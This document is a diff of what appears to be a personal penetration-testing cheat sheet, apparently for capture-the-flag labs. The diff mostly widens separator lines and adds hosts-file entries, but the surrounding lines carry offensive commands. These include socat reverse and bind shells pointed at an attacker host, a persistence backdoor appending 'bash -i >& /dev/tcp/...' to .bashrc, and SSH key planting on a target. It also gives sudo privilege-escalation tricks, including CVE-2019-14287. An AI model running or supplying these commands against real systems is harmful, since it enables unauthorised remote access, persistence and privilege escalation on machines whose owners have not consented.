@@ -3,14 +3,14 @@
 /bin/bash -ip
 perl -e 'exec "/bin/bash";'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
------------------
+---------------------------------------------------------------------
 CTRL + Z
 stty raw -echo;fg
 reset
 export SHELL=bash
 export TERM=xterm-256color
 stty rows 52 columns 209 
------------------
+---------------------------------------------------------------------
 socat TCP-L:<port> # in our system
 socat TCP-L:<port> FILE:`tty`,raw,echo=0  # in our system
 
@@ -18,7 +18,7 @@ socat TCP:<local-ip>:<local-port> EXEC:"bash -li" # in our system for linux
 socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes # in our system for windows
 
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # in target system
------------------
+---------------------------------------------------------------------
 # in target
 mkdir -p ~/.ssh/
 ssh-keygen
@@ -27,9 +27,12 @@ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGQvOtGg1iFei0La62IoJcnK+JxlCF/E9XRRbo
 # in our kali 
 chmod 600 id_rsa 
 ssh user@10.10.10.10 -i id_rsa  
------------------
+---------------------------------------------------------------------
 echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
------------------
+---------------------------------------------------------------------
+echo "10.10.10.10 webenum.thm" >> /etc/hosts
+echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
+---------------------------------------------------------------------
 sudo -u#-1 /bin/bash # CVE-2019-14287
 sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
